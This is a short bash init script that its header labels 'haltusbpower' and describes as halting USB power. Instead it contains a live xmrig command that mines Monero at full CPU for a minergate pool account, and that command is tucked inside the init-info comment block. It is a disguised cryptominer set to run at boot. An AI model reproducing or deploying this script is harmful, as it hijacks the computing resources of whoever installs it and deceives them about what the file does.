#!/bin/bash
### BEGIN INIT INFO
# Provides:          haltusbpower
# Required-Start:    $all
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: Halts USB power...
xmrig --print-time 7 --max-cpu-usage 100 -o xmr.pool.minergate.com:45700 -u adynikez@gmail.com -p x -k --nicehash
### END INIT INFO

